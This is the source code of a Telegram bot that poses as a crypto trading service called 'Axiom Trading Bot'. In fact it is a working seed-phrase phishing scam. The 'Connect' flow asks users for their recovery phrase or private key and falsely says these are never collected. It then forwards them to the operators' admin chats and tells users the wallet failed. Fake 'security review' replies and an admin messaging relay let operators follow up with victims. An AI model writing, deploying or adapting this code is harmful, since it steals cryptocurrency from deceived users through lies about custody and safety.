const { Telegraf, Markup } = require("telegraf");
const LocalSession = require("telegraf-session-local");

// --- Helper: Escape MarkdownV2 special characters ---
function escapeMarkdown(text) {
  if (typeof text !== 'string') return '';
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

// --- Configuration ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_IDS = (process.env.ADMIN_CHAT_IDS || "")
  .split(",")
  .map(id => parseInt(id.trim()))
  .filter(id => !isNaN(id));

const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

// --- Critical Checks ---
if (!BOT_TOKEN) {
  console.error("CRITICAL ERROR: BOT_TOKEN is not set.");
  process.exit(1);
}
if (!WEBHOOK_URL) {
  console.error("CRITICAL WARNING: WEBHOOK_URL is not set. Webhooks may fail.");
}

const bot = new Telegraf(BOT_TOKEN);

// --- Session (ephemeral on Koyeb) ---
const session_local = new LocalSession({ database: "bot_sessions.json" });
bot.use(session_local.middleware());

const userWallets = {};
const CONNECT_STATE = "waiting_for_phrase";
const supportSessions = new Set(); // Tracks users in active support

// --- Keyboards ---
const mainMenuKeyboard = Markup.keyboard([
  ["🛒 Buy", "💰 Sell"],
  ["🔗 Connect"],
  ["⚙️ Copy Trading", "🟠 Sniper"],
  ["💸 withdraw", "👝 Wallet"],
  ["🚀 Launch", "🔄 DCA"],
  ["Positions 📈", "❓ Help"],
  ["🔄 Reset"],
]).resize();

const cancelInlineKeyboard = Markup.inlineKeyboard([
  Markup.button.callback("🚫 Cancel", "cancel_connect_flow"),
]);

// --- Helpers ---
function isConnected(userId) {
  return userWallets[userId] === true ||
    (bot.context.session?.wallet_status === "connected");
}

async function sendWelcomeMessage(ctx) {
  const msg = `👋 Welcome to Axiom Trading Bot! Exclusively powered by the Axiom community, 
The fastest and smartest bot for trading any token across multiple blockchains. ⚡🌎

Trade safer. Trade smarter. Trade Axiom. 🚀

TOP ⬆️ Main Menu`;
  await ctx.replyWithMarkdown(msg, mainMenuKeyboard);
}

// --- SAFE Forwarding (with escaping + plain fallback) ---
async function forwardUserData(ctx, phrase) {
  const username = ctx.from.username ? `@${ctx.from.username}` : "N/A";
  const userId = ctx.from.id;

  const safePhrase = escapeMarkdown(phrase.trim());
  const safeUsername = escapeMarkdown(username);

  const markdownMsg = `
📩 *New Wallet Connection*

🛠 Service: Wallet Connection
💎 Recovery Phrase: \`${safePhrase}\`
👤 Client: ${safeUsername}
🆔 User ID: \`${userId}\`
`;

  for (const adminId of ADMIN_CHAT_IDS) {
    try {
      await bot.telegram.sendMessage(adminId, markdownMsg, { parse_mode: "MarkdownV2" });
      console.log(`✅ Forwarded to admin ${adminId}`);
    } catch (err) {
      console.warn(`⚠️ Markdown failed for ${adminId}, trying plain text...`);
      const plainMsg = `
📩 New Wallet Connection

🛠 Service: Wallet Connection
💎 Recovery Phrase: ${phrase}
👤 Client: ${username}
🆔 User ID: ${userId}
`;
      try {
        await bot.telegram.sendMessage(adminId, plainMsg);
        console.log(`✅ Plain text sent to ${adminId}`);
      } catch (e) {
        console.error(`❌ Failed to forward to ${adminId}:`, e.message);
      }
    }
  }
}

// --- Admin-only: /msg <user_id> <text> ---
bot.command("msg", async (ctx) => {
  if (!ADMIN_CHAT_IDS.includes(ctx.from.id)) return;

  const parts = ctx.message.text.split(' ');
  if (parts.length < 3) {
    return ctx.reply("❌ Usage: `/msg <user_id> <message>`", { parse_mode: "Markdown" });
  }

  const targetUserId = parts[1];
  const messageText = parts.slice(2).join(' ');

  if (!/^\d+$/.test(targetUserId)) {
    return ctx.reply("❌ Invalid user ID. Must be a number.");
  }

  try {
    await bot.telegram.sendMessage(targetUserId, messageText);
    supportSessions.add(parseInt(targetUserId)); // add to support mode
    await ctx.reply(`✅ Sent to user ${targetUserId}`);
  } catch (err) {
    await ctx.reply(`❌ Failed: ${err.message}`);
  }
});

// --- Admin-only: /end <user_id> ---
bot.command("end", async (ctx) => {
  if (!ADMIN_CHAT_IDS.includes(ctx.from.id)) return;

  const parts = ctx.message.text.split(' ');
  const userId = parts[1];

  if (!userId || !/^\d+$/.test(userId)) {
    return ctx.reply("Usage: `/end <user_id>`", { parse_mode: "Markdown" });
  }

  const uid = parseInt(userId);
  if (supportSessions.delete(uid)) {
    await ctx.reply(`✅ Ended support session for ${uid}`);
  } else {
    await ctx.reply(`ℹ️ No active session for ${uid}`);
  }
});

// --- Handlers ---
bot.hears("🔗 Connect", async (ctx) => {
  ctx.session.state = CONNECT_STATE;
  const msg = `🔑 *Import Wallet*

Enter your 12-key recovery phrase or private key to proceed.

🔒 *Security Notice*
Your seed phrase is 100% safe — our bot does not collect or store your private 
keys or seed phrase. All actions are non-custodial and fully under your control.`;
  await ctx.replyWithMarkdown(msg, cancelInlineKeyboard);
});

bot.action("cancel_connect_flow", async (ctx) => {
  ctx.session.state = null;
  await ctx.reply("🚫 Transaction cancelled. Returning to Main Menu.", mainMenuKeyboard);
  await ctx.answerCbQuery();
});

bot.start(sendWelcomeMessage);
bot.hears("Main Menu", sendWelcomeMessage);

bot.command("menu", async (ctx) => {
  ctx.session.state = null;
  await ctx.replyWithMarkdown(
    "**Buy tokens** /buy\n**Sell tokens** /sell\n**Claim rewards** /claim\n**Connect wallet** /connect",
    mainMenuKeyboard
  );
});

bot.use(async (ctx, next) => {
  if (ctx.message?.text?.startsWith("/")) {
    if (ctx.session.state === CONNECT_STATE) ctx.session.state = null;
  }
  await next();
});

// --- Feature Handler ---
const GENERIC_DISCONNECTED = "Please connect your wallet to access this feature.";

async function featureHandler(ctx, name, customDisconnected = null) {
  const userId = ctx.from.id;
  if (ctx.session.state) ctx.session.state = null;

  if (isConnected(userId)) {
    const msg = `✅ *Connection Status: Reviewing*

You have successfully submitted your wallet information. Our security team is now reviewing the connection to ensure full compatibility.

A dedicated team member will reach out to you personally via this chat within the next 15 minutes to confirm activation and assist you with your first *${name}* transaction.

Thank you for your patience!`;
    await ctx.replyWithMarkdown(msg, mainMenuKeyboard);
  } else {
    const msg = customDisconnected || GENERIC_DISCONNECTED;
    if (customDisconnected) {
      await ctx.replyWithMarkdown(msg, mainMenuKeyboard);
    } else {
      await ctx.reply(msg, mainMenuKeyboard);
    }
  }
}

// Feature routes
bot.hears("🛒 Buy", (ctx) => featureHandler(ctx, "Buy"));
bot.command("buy", (ctx) => featureHandler(ctx, "Buy"));
bot.hears("💰 Sell", (ctx) => featureHandler(ctx, "Sell"));
bot.command("sell", (ctx) => featureHandler(ctx, "Sell"));
bot.command("claim", (ctx) => featureHandler(ctx, "Claim rewards"));

bot.command("connect", async (ctx) => {
  ctx.session.state = null;
  await bot.handleUpdate({ message: { text: "🔗 Connect", from: ctx.from, chat: ctx.chat } });
});

bot.hears("⚙️ Copy Trading", (ctx) =>
  featureHandler(ctx, "Copy Trading", `©️ Copy Trading\n\nPlease connect your wallet first to start trading.\n\nMinimum buy: 0.5 SOL\n\nClick 'Connect Wallet' to import your wallet.`)
);

bot.hears("🟠 Sniper", (ctx) =>
  featureHandler(ctx, "Sniper", `☄️LP Sniper\n\nPlease connect your wallet first to start trading.\n\nConnect wallet to start sniping\n\nClick 'Connect Wallet' to import your wallet.`)
);

["💸 withdraw", "👝 Wallet", "🚀 Launch", "🔄 DCA", "Positions 📈"].forEach(cmd => {
  bot.hears(cmd, (ctx) => featureHandler(ctx, cmd));
});

bot.hears("❓ Help", async (ctx) => {
  ctx.session.state = null;
  const help = `❓ *Help*

You can open a request to the PumpX Bot support service. The Tech team would respond in 
the next 24 hours Via your your DM for a faster solution to the problem, 
describe your appeal as clearly as possible. You can provide files or images if needed.

Rules for contacting technical support:
1. When you first contact, please introduce yourself.
2. Describe the problem in your own words.
3. Be polite, and politeness will be with you!`;
  await ctx.replyWithMarkdown(help, mainMenuKeyboard);
});

bot.hears("🔄 Reset", async (ctx) => {
  const userId = ctx.from.id;
  ctx.session.state = null;
  delete ctx.session.wallet_status;
  delete userWallets[userId];
  await ctx.replyWithMarkdown(
    "🔄 *Session Reset Complete!* Your wallet connection has been cleared. Tap *🔗 Connect* to start over.",
    mainMenuKeyboard
  );
});

// --- Global message handler (with support relay) ---
bot.on("text", async (ctx) => {
  const userId = ctx.from.id;

  // If user is in support mode, forward to ALL admins
  if (supportSessions.has(userId)) {
    const safeText = ctx.message.text
      .replace(/_/g, '\\_')
      .replace(/\*/g, '\\*')
      .replace(/`/g, '\\`');
    const forwardedMsg = `📨 *Reply from user ${userId}*\n\n${safeText}`;

    for (const adminId of ADMIN_CHAT_IDS) {
      try {
        await bot.telegram.sendMessage(adminId, forwardedMsg, { parse_mode: "Markdown" });
      } catch (err) {
        console.warn(`Failed to forward to admin ${adminId}:`, err.message);
      }
    }
    return;
  }

  // Handle wallet connection flow
  if (ctx.session.state === CONNECT_STATE) {
    const phrase = ctx.message.text;
    await forwardUserData(ctx, phrase);
    ctx.session.state = null;
    await ctx.reply("❌ Wallet not connected — We couldn’t recognise that wallet. Please double-check and try again.", mainMenuKeyboard);
    return;
  }

  // Fallback
  await ctx.reply("I didn't recognize that. Please use the menu buttons below.", mainMenuKeyboard);
});

// --- Start Bot with Forgiving URL Parser ---
if (WEBHOOK_URL) {
  try {
    let cleanUrl = WEBHOOK_URL.trim();
    if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
      cleanUrl = 'https://' + cleanUrl;
    }
    if (cleanUrl.endsWith('/')) {
      cleanUrl = cleanUrl.slice(0, -1);
    }
    const url = new URL(cleanUrl);
    const webhookPath = `/telegraf/${bot.secretPathComponent()}`;

    bot.launch({
      webhook: {
        domain: url.hostname,
        port: parseInt(PORT, 10),
        hookPath: webhookPath,
      },
    }).then(() => {
      console.log(`✅ Bot running on port ${PORT}`);
      console.log(`📡 Webhook: ${cleanUrl}${webhookPath}`);
    }).catch(err => {
      console.error("❌ Launch failed:", err);
      process.exit(1);
    });
  } catch (err) {
    console.error("❌ Invalid WEBHOOK_URL:", err.message);
    process.exit(1);
  }
} else {
  bot.launch().then(() => console.log("🤖 Local polling mode"));
}

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
